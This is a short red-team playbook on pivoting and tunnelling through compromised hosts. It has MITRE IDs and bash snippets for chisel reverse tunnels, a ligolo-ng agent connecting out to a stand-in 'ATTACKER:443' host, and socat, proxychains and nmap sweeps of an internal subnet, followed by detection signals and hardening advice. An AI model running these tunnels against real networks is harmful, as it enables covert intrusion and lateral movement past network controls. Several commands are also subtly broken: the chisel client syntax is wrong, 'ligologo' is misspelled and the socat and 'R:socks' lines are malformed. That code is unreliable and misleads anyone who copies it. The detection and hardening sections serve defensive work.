# Playbook - Pivoting, Relaying and Tunnelling

| Field | Value |
|---|---|
| `playbook_id` | PB-NET-PIVOT |
| `attack_ids` | T1090 (Proxy), T1572 (Protocol Tunneling) |
| `engines` | `05-engines/metasploit/modules/auxiliary/gateway-tunnel.md` |
| `detections` | Suricata `ssa-tunneling.rules`, Wazuh `86710` |

## 1. Scenario catalogue

| Situation | Technique | Tooling |
|---|---|---|
| Only SSH exposed | SSH local/remote port forwarding | `ssh -L`, `ssh -J` |
| SMB only | SOCKS over SMB | `pivoting` via Impacket, chisel over SMB |
| WinRM only | WinRM port forward | Evil-WinRM, `winrs` |
| HTTP only | CONNECT / reverse tunnel | `chisel`, `ligolo-ng` |
| No inbound | Reverse shell + pivot | `metasploit` pivot, `chisel` client |
| SMB signing enforced | Named pipe / DCOM | Impacket `psexec`, `atexec` |

## 2. Chisel (HTTP tunnel over a single port)

```bash
# Attacker (server)
./chisel server --reverse --port 8080

# Through the compromised jump host
./chisel CLIENT:1080 R:1080:127.0.0.1:8080
```

## 3. Ligolo-ng (transparent layer-3 tunnel)

```bash
# Attacker
./ligologo proxy -selfcert -Laddr 0.0.0.0:443
# Agent on target
./ligologo agent -proxy SOCKS5://ATTACKER:443 -ignore-cert
```

## 4. SOCKS + proxychains

```bash
# Pivot host
socat TCP-LISTEN:1080,fork,reuseaddr SOCKS:127.0.0.1:1080
# Client
./chisel CLIENT:9050 R:socks ->127.0.0.1:1080
proxychains nmap -sT -p 80,443,445 -iL /dev/stdin <<< "10.10.10.0/24"
```

## 5. Detection

| Tunnel | Signal |
|---|---|
| SSH port forward | Long-lived SSH with no interactive TTY, high entropy channel data |
| HTTP CONNECT | Suricata `http.method=CONNECT`, destination port not 443 |
| Reverse HTTP tunnel | Regular beaconing to a single URI, constant interval, no session affinity |
| SOCKS proxy | Application (curl/nmap) connecting to non-standard local port |

## 6. Hardening

* Egress filtering: deny outbound 443 except to approved destinations.
* No inbound management ports on the internet; bastion + VPN.
* `AllowTcpForwarding no` for unprivileged accounts.
